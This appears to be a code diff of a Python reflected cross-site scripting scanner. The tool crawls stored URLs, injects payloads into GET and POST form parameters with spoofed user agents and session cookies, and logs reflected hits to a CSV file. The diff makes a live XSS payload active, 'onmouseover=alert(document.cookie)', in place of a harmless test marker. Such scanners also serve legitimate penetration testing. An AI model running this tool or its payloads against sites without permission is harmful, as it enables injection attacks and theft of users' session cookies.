@@ -11,9 +11,9 @@ from urlparse import parse_qs
 from urlparse import urlunsplit
 import timeit
 import argparse
+import os
 
-
-# crtl + c
+# stage1,2를 분리하고 각각을 함수로 만들어놓기
 
 user_agents = ["Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1667.0 Safari/537.36", \
                 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1664.3 Safari/537.36", \
@@ -65,8 +65,6 @@ def make_parameters(url):
         forms = [f for f in br.forms()]
         
     except Exception as e: 
-        print url
-        print e
         return False
     
     if forms == []:
@@ -110,15 +108,12 @@ def web_request(payloads, method, action, case, attack_commands):
     
     if method == "GET" and case == "case1":
         
-        payloads = dictToQuery(payloads)
-        query = action + "?" + payloads
-        
         try:
             
             if cookie is None:
                 
                 try:
-                    res = requests.get(query, timeout = 1, \
+                    res = requests.get(action, timeout = 1, \
                                        headers = {"User-Agent" : random.choice(user_agents)},\
                                        verify = False,\
                                        params = payloads)
@@ -128,30 +123,28 @@ def web_request(payloads, method, action, case, attack_commands):
             
                         if res_contents.find(attack_command) != -1:
                             f = open("r_xss_result.csv", "a+")
-            #                 f1 = unicode(f1, 'euc-kr').encode('utf-8')
-                            f.write(method + "," + case + "," + query + "\n")
+                            f.write(method + "," + case + "," + res.url + "\n")
                             f.close()
-                            print query
-                    
+                            print res.url
                 except:
                     pass
             else:
                 
                 try:
-                    res = requests.get(query, timeout = 1,\
+                    res = requests.get(action, timeout = 1,\
                                        headers = {"User-Agent" : random.choice(user_agents),\
                                                   "Cookie" : cookie},\
-                                       verify = False)
+                                       verify = False,\
+                                       params = payloads)
                     res_contents = res.content
 
                     for attack_command in attack_commands:
             
                         if res_contents.find(attack_command) != -1:
                             f = open("r_xss_result.csv", "a+")
-            #                 f1 = unicode(f1, 'euc-kr').encode('utf-8')
-                            f.write(method + "," + case + "," + query + "\n")
+                            f.write(method + "," + case + "," + res.url + "\n")
                             f.close()
-                            print query
+                            print res.url
    
                 except:
                     pass                          
@@ -167,9 +160,6 @@ def web_request(payloads, method, action, case, attack_commands):
         url_low = urlparse(action)[2]     
         
         action = urlunsplit((url_scheme, url_location, url_low, "", ""))
-
-#         payloads = dictToQuery(payloads)
-#         query = action + "?" + payloads
 
         try:
             
@@ -188,10 +178,9 @@ def web_request(payloads, method, action, case, attack_commands):
             
                         if res_contents.find(attack_command) != -1:
                             f = open("r_xss_result.csv", "a+")
-            #                 f1 = unicode(f1, 'euc-kr').encode('utf-8')
-                            f.write(method + "," + case + "," + query + "\n")
+                            f.write(method + "," + case + "," + res.url + "\n")
                             f.close()
-                            print query                   
+                            print res.url                  
                 except:
                     pass
                 
@@ -211,14 +200,12 @@ def web_request(payloads, method, action, case, attack_commands):
             
                         if res_contents.find(attack_command) != -1:
                             f = open("r_xss_result.csv", "a+")
-            #                 f1 = unicode(f1, 'euc-kr').encode('utf-8')
-                            f.write(method + "," + case + "," + query + "\n")
+                            f.write(method + "," + case + "," + res.url + "\n")
                             f.close()
-                            print query
+                            print res.url
                  
                 except:
                     pass
-#             print "real request: " + query
                              
         except Exception as e: 
             print action
@@ -242,10 +229,15 @@ def web_request(payloads, method, action, case, attack_commands):
             
                         if res_contents.find(attack_command) != -1:
                             f = open("r_xss_result.csv", "a+")
-            #                 f1 = unicode(f1, 'euc-kr').encode('utf-8')
-                            f.write(method + "," + case + "," + query + "\n")
-                            f.close()
-                            print query
+                            
+                            try:
+                                payloads = dictToQuery(payloads)
+                                f.write(method + "," + case + "," + res.url + "," + payloads + "\n")
+                                f.close()
+                            except: 
+                                f.write(method + "," + case + "," + res.url + "," + str(payloads) + "\n")
+                                f.close()
+                            print res.url
                     
                 except:
                     pass
@@ -265,10 +257,15 @@ def web_request(payloads, method, action, case, attack_commands):
             
                         if res_contents.find(attack_command) != -1:
                             f = open("r_xss_result.csv", "a+")
-            #                 f1 = unicode(f1, 'euc-kr').encode('utf-8')
-                            f.write(method + "," + case + "," + query + "\n")
-                            f.close()
-                            print query
+                            
+                            try:
+                                payloads = dictToQuery(payloads)
+                                f.write(method + "," + case + "," + res.url + "," + payloads + "\n")
+                                f.close()
+                            except: 
+                                f.write(method + "," + case + "," + res.url + "," + str(payloads) + "\n")
+                                f.close()
+                            print res.url
                     
                 except:
                     pass
@@ -277,8 +274,6 @@ def web_request(payloads, method, action, case, attack_commands):
             print action
             print e
              
-    query = ""      
-
 
 def predict_xss_attack_time(attack_commands):
 
@@ -292,7 +287,7 @@ def predict_xss_attack_time(attack_commands):
         payloads_number = len(payloads.keys())
         cnt += payloads_number
     
-    all_count = str(cnt * attack_command_len)
+    all_count = str(cnt * attack_command_len) * 3
     estimate_time = str((cnt * attack_command_len * 0.005))
     # request 하나 당 0.005 ~ 0.01초가 걸리는 듯
     
@@ -345,8 +340,13 @@ def main():
         
     except:
         cookie = None
-            
 
+    try:
+        os.remove("r_xss_result.csv")
+    except:
+        pass
+    
+    
     global req_cnt
     req_cnt = 0
     
@@ -359,8 +359,8 @@ def main():
     global cur
     cur = conn.cursor()
         
-#     attack_commands = ["\" onmouseover=alert(document.cookie)>"]
-    attack_commands = ["onmouseovertest"]
+    attack_commands = ["\" onmouseover=alert(document.cookie)>"]
+#     attack_commands = ["onmouseovertest"]
 
     links_to_visit_params = []
     
@@ -392,6 +392,10 @@ def main():
                 xss_attack(payloads, "GET", url, "case1", attack_commands)
                 links_to_visit_params.append(url_with_params)
 
+    end_time = timeit.default_timer() 
+    print '\nreflected xss attack\'s stage 1 is done: ', end_time - start_time
+    print "you send requests %s times" % req_cnt
+    
 #setp2 
     cur.execute("select url from " + table_name + " where res_code = '200'")
     
@@ -439,13 +443,12 @@ def main():
                         
                         xss_attack(payloads, "POST", action, "case2", attack_commands)
               
-                        links_to_visit_params.append(url_with_params)
-                                           
+                        links_to_visit_params.append(url_with_params)                    
                             
     cur.close()
     end_time = timeit.default_timer() 
-    print '\nreflected xss attack is done: ', end_time - start_time
-        
+    print '\nreflected xss attack\'s stage 2 is done: ', end_time - start_time
+    print "you send requests %s times" % req_cnt
     
 if __name__ == "__main__":
     main()
